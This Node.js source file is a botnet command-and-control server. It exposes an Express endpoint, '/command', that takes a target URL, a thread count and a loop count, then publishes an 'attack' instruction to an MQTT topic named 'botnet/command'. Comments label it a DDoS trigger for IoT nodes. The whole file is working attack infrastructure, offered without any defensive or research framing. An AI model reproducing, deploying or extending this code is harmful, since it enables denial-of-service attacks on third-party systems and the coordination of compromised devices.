const express = require('express');
const mqtt = require('mqtt');

const app = express();
app.use(express.json());

// MQTT Configuration
const MQTT_BROKER_HOST = process.env.MQTT_BROKER_HOST || 'localhost';
const MQTT_PORT = process.env.MQTT_PORT || 1883;
const COMMAND_TOPIC = 'botnet/command';

const mqttClient = mqtt.connect(`mqtt://${MQTT_BROKER_HOST}:${MQTT_PORT}`);

mqttClient.on('connect', () => {
  console.log(`Connected to MQTT Broker at ${MQTT_BROKER_HOST}:${MQTT_PORT}`);
});

// API endpoint to trigger DDoS command
app.post('/command', (req, res) => {
  const { target,number_thread,loop_count } = req.body;

  if (!target || !number_thread || !loop_count) {
    return res.status(400).send({ error: 'Target URL is required' });
  }

  const message = JSON.stringify({ action: 'attack', target,number_thread,loop_count });
  mqttClient.publish(COMMAND_TOPIC, message, () => {
    console.log(`Command sent to topic ${COMMAND_TOPIC}: ${message}`);
    res.send({ message: `Command sent to attack ${target}` });
  });
});

// Start the Express server
const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Node control IOT running on http://localhost:${PORT}`);
});
